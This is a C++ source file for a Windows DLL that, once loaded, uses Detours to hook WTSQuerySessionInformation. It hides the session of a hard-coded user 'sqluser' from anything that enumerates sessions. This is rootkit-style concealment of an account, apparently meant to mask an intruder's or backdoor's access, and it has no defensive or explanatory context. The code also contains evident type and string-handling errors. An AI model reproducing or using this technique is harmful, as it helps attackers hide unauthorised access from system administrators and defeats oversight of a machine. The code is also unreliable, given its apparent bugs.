#include <iostream>
#include <windows.h>
#include <WtsApi32.h>
#include <tchar.h>

extern "C" _declspec(dllexport) bool HideUserSession(TCHAR * wcsUserName, int iLen);

TCHAR gUserName[128];
int gLen;
static BOOL(WINAPI* TrueWTSQuerySessionInformation)(
	__in   HANDLE hServer,
	__in   DWORD SessionId,
	__in   WTS_INFO_CLASS WTSInfoClass,
	__out  LPTSTR* ppBuffer,
	__out  DWORD* pBytesReturned
	) = WTSQuerySessionInformation;
BOOL WINAPI HookWTSQuerySessionInformation(
	__in   HANDLE hServer,
	__in   DWORD SessionId,
	__in   WTS_INFO_CLASS WTSInfoClass,
	__out  LPTSTR* ppBuffer,
	__out  DWORD* pBytesReturned
) {
	TrueWTSQuerySessionInformation(hServer, SessionId, WTSInfoClass, ppBuffer, pBytesReturned);
	if (strncmp((char*)*ppBuffer, (char*)gUserName, gLen) == 0) {
		return false;
	}
	return true;
}
BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	{
		ZeroMemory(gUserName, 128 * 2);
		HideUserSession((TCHAR*)("sqluser"), sizeof(L"sqluser"));
		break;
	}
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		//DetourTransactionBegin();
		//DetourUpdateThread(GetCurrentThread());
  //DetourDetach(&(PVOID&)TrueWTSQuerySessionInformation, HookWTSQuerySessionInformation);
  //DetourTransactionCommit();
		break;
	}
	return TRUE;
}
extern "C" _declspec(dllexport) bool HideUserSession(TCHAR * wcsUserName, int iLen) {
	CopyMemory(gUserName, wcsUserName, iLen);
	gLen = iLen;
	DetourRestoreAfterWith();
	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());
	DetourAttach(&(PVOID&)TrueWTSQuerySessionInformation, HookWTSQuerySessionInformation);
	LONG error = DetourTransactionCommit();
	if (error == NO_ERROR) {
		//::MessageBox(NULL, L"load detours success!", L"tips", 0);
		return true;
	}
	else {
		//::MessageBox(NULL, L"load detours failed!", L"tips", 0);
		return false;
	}
}